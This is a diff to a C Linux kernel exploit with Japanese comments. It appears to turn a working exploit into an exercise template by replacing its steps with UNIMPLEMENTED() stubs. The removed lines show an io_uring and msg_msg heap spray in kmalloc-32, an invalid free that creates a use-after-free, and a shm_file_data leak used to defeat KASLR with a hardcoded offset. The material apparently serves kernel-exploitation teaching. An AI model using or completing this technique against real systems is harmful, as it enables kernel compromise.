@@ -183,40 +183,39 @@ int main(void) {
   /**
    * kmalloc-32に`io_buffer`を大量に確保する。
    * kheap内を整理する目的 (heap feng shui).
+   * バッファとしてファイル冒頭に定義した`iobufs`を使う。
    */
   puts("[+] Spraying kmalloc-32 with `io_buffer` ...");
-  ring_submit_buffer(&ring, (char *)iobufs, PAGE, NUM_IOBUF, 0, 0);
+  UNIMPLEMENTED();
 
   /**
    * `msg_msg` / `msg_seg`をkmalloc-32内の`io_buffer`の直後に確保する
    */
   puts("[+] Spraying msg_msg with size 0x20...");
-  int qid = allocate_msgmsg20(&msg, 0x1);
+  UNIMPLEMENTED();
 
   /**
    * `io_buffer`のInvalid Freeを発生させて先程確保したメッセージを解法する。
    */
   puts("[+] Invoking invalid free...");
-  ring_submit_read(&ring, fd, 0x20, 0, 0);
-  ring_wait_cqe(&ring);
+  UNIMPLEMENTED();
 
   /**
    * `shm_file_data`をkmalloc-32に確保する。
    * ついさっき解放したメッセージに重ねて確保される。
    */
   puts("[+] Allocating shm_file_data on UAF-ed msg...");
-  allocate_shm_file_data();
+  UNIMPLEMENTED();
 
   /**
    * メッセージの上に重なった`shm_file_data`を読む。
    * `init_ipc_ns`のアドレスがleakできる。
    */
   puts("[+] Leaking UAF-ed msg_msg...");
-  ssize_t n_rcv = msgrcv(qid, &msg, sizeof(msg), msg.mtype, MSG_NOERROR);
-  printf("[!] 0x%lX bytes received\n", n_rcv);
-  ulong *leaked = (ulong *)&msg.mtext[DATALEN_MSG];
-  const ulong init_ipc_ns = leaked[0];
-  kbase = init_ipc_ns - 0xEB0D60;
+  UNIMPLEMENTED();
+
+  const ulong init_ipc_ns = UNIMPLEMENTED_(0UL);
+  const ulong kbase = init_ipc_ns - UNIMPLEMENTED_(0UL);
   printf("[!] init_ipc_ns: 0x%lx\n", init_ipc_ns);
   printf("[!] kbase: 0x%lx\n", kbase);
 
